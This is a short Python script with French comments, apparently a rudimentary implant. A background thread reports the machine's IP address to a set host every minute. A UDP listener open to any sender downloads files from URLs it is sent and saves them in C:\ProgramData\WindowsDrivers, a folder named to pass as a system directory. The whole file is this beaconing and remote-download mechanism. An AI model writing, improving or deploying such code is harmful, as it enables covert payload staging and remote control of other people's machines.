import socket
from datetime import datetime, timezone
import sys
import os
import requests
import threading
import time

sock = None

dest_ip = "localhost"
dest_port = 6666  # Port du destinataire (à remplacer par votre port)


def get_local_ip():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return local_ip


def send_ip():
    local_ip = get_local_ip()
    while True:
        try:
            response = requests.post(f"http://{dest_ip}:{dest_port}/receive_ip", json={'ip': local_ip})
            response.raise_for_status()
            print(f"IP sent successfully to {dest_ip}:{dest_port}")
        except requests.exceptions.RequestException as e:
            print(f"Failed to send IP: {e}")
        time.sleep(60)


def download_file(url, save_path):
    try:
        response = requests.get(url)
        response.raise_for_status()
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        with open(save_path, 'wb') as file:
            file.write(response.content)
        print(f"File downloaded successfully and saved to {save_path}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to download file: {e}")


def receive_udp_message(ip, port):
    global sock
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((ip, int(port)))
        print("Press Ctrl+C to exit")
        print(f"Listening on {ip}:{port}...")
        while True:
            data, addr = sock.recvfrom(1024)
            message = data.decode()
            current_time = datetime.now(timezone.utc).strftime('%H:%M:%S GMT')
            print(f"{current_time} - Received message from {addr[0]}: {message}")
            if message.strip().lower().startswith("download"):
                try:
                    url = message.split(" ", 1)[1]
                    file_name = url.split("/")[-1]
                    save_path = os.path.join('C:\\ProgramData\\WindowsDrivers', file_name)
                    download_file(url, save_path)
                except IndexError:
                    print("Error: No URL provided after 'download' command")

    except ValueError:
        if isinstance(sock, socket.socket):
            sock.close()
        print("Error: Port must be an integer")
        sys.exit(1)
    except KeyboardInterrupt:
        if isinstance(sock, socket.socket):
            sock.close()
        print("\nProgram stopped")
        sys.exit(0)
    except Exception as error:
        if isinstance(sock, socket.socket):
            sock.close()
        print(f"An error occurred: {error}")
        sys.exit(1)


if __name__ == "__main__":
    listen_ip = '0.0.0.0'
    try:
        # Démarrer le thread pour envoyer l'IP en boucle toutes les minutes
        threading.Thread(target=send_ip, daemon=True).start()

        while True:
            try:
                listen_port = input("Listener Port (default 7777): ")
                if not listen_port:
                    listen_port = 7777
                else:
                    listen_port = int(listen_port)
                receive_udp_message(listen_ip, listen_port)
                break
            except ValueError:
                print("Error: Destination port must be a valid integer.")
    except KeyboardInterrupt:
        if isinstance(sock, socket.socket):
            sock.close()
        print("\nProgram stopped")
        sys.exit(0)
